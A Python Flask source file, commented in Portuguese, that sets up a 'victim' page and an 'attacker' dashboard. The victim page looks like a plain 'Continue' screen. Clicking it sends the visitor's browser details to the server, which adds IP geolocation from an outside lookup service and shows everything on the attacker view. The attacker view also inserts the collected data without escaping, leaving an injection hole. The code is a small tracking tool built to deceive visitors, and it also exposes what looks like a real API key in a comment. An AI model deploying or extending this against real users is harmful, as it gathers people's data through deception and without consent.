from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import requests
import os
from dotenv import load_dotenv

# Carrega as variáveis de ambiente do arquivo .env
load_dotenv()

app = Flask(__name__)
CORS(app)  # Habilita CORS para todas as rotas

# Chave da API para consulta de IP
# API_KEY = '3bfebc53-25f3-4b22-8510-b4f71736be65'
API_KEY = os.getenv('API_KEY')
API_URL = f'https://apiip.net/api/check?accessKey={API_KEY}'

data_store = []

# Página HTML para a vítima
victim_page = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Data Collection</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.1.2/dist/tailwind.min.css" rel="stylesheet">
    <script>
        async function collectData() {
            const data = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };

            try {
                const response = await fetch('/collect', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });

                if (response.ok) {
                    alert('Data sent successfully!');
                } else {
                    console.log('Server response error:', response.statusText);
                    alert('Failed to send data');
                }
            } catch (error) {
                console.error('Network error:', error);
                alert('Failed to send data');
            }
        }
    </script>
</head>
<body class="bg-gray-100 flex items-center justify-center h-screen">
    <div class="bg-white p-8 rounded shadow-lg text-center">
        <h1 class="text-2xl font-bold mb-4">Welcome</h1>
        <p class="mb-4">Click the button below to proceed.</p>
        <button onclick="collectData()" class="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-700">Continue</button>
    </div>
</body>
</html>
"""

# Página HTML para o atacante visualizar os dados coletados
attacker_page = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Collected Data</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.1.2/dist/tailwind.min.css" rel="stylesheet">
</head>
<body class="bg-gray-100 flex items-center justify-center h-screen">
    <div class="bg-white p-8 rounded shadow-lg w-2/3">
        <h1 class="text-2xl font-bold mb-4 text-center">Collected User Data</h1>
        <div id="data-container" class="text-left"></div>
    </div>

    <script>
        async function fetchData() {
            const response = await fetch('/view-data');
            const data = await response.json();
            const container = document.getElementById('data-container');
            container.innerHTML = data.map(entry => `
                <div class="border-b border-gray-300 py-2">
                    <p><strong>User Agent:</strong> ${entry.user_data.userAgent}</p>
                    <p><strong>Language:</strong> ${entry.user_data.language}</p>
                    <p><strong>Platform:</strong> ${entry.user_data.platform}</p>
                    <p><strong>Timezone:</strong> ${entry.user_data.timezone}</p>
                    <p><strong>IP Info:</strong> ${JSON.stringify(entry.ip_info)}</p>
                </div>
            `).join('');
        }
        
        fetchData();
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    # Redireciona para a página da vítima
    return render_template_string(victim_page)

@app.route('/collect', methods=['POST'])
def collect():
    user_data = request.json

    # Requisição para API externa com o IP especificado
    try:
        ip = '67.250.186.196'  # Aqui pode-se substituir pelo IP desejado
        res = requests.get(f"{API_URL}&ip={ip}")
        json_response = res.json()

        # Adiciona os dados recebidos ao armazenamento
        full_data = {
            "user_data": user_data,
            "ip_info": json_response
        }

        data_store.append(full_data)
        return jsonify({"status": "success", "data": full_data}), 200

    except Exception as e:
        print(f"Error fetching IP info: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/view')
def view():
    # Página do atacante para ver os dados coletados
    return render_template_string(attacker_page)

@app.route('/view-data', methods=['GET'])
def view_data():
    # Retorna todos os dados coletados
    return jsonify(data_store), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
